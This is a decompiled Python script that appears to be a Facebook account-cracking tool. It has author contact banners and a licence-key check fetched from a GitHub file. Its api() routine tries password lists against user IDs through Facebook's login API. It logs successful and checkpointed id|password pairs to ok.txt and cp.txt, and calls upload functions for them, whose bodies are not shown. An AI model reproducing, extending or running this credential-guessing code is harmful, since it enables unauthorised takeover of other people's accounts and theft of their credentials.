# Decompile by : REDOUPSHACK
 ...
 def helpnote(): 
         ...
         exit(" [*] FACEBOOK :  https://www.facebook.com/Red.oupshack") 
 ...
 def notice(): 
         ...
         runtxt("\033[0;92m ADMIN WHATSAPP >> 0330940220 ") 
         subprocess.check_output(["am", "start", "https://wa.me/0330940220"]) 
 ...
 class Main: 
         def __init__(self): 
                 ...
                 self.loop = 0 
                 try: 
                         plr = requests.get('https://github.com/Redoupstrickeur/approval/blob/main/Redoupstrickeur-approval.txt').text 
                         if basesplit in plr: 
                                 key = basesplit 
 ...
 \033[0;91m ..###..###..####.##....##.####.........##....##.####.##....##..######.. 
  ...
  > \033[0;96mDEVELOPER     : REDOUPSHACKEUR
  > \033[0;96mFACEBOOK ID   : REDOUPSTRICKEUR 
  > \033[0;96mWHATSAPP      : 0331875920
  \033[0;96m> GITHUB        : Redoupstrickeur 
         ...
         def api(self, uid, pwx): 
                 ...
                 for pw in pwx: 
                         ...
                         if "session_key" in response.text and "EAAA" in response.text: 
                                 ...
                                 open("ok.txt","a").write(" [REDOUPS-OK] %s|%s\n"%(uid, pw)) 
                                 uploadoks() 
                                 break 
                         elif "www.facebook.com" in response.json()["error_msg"]: 
                                 print("\r \033[0;93m[REDOUPS-CP] %s|%s\033[0;97m         "%(uid, pw)) 
                                 self.cp.append("%s|%s"%(uid, pw)) 
                                 open("cp.txt","a").write(" [REDOUPS-CP] %s|%s\n"%(uid, pw)) 
                                 uploadcps() 
                                 break 
                         else: 
                                 continue 
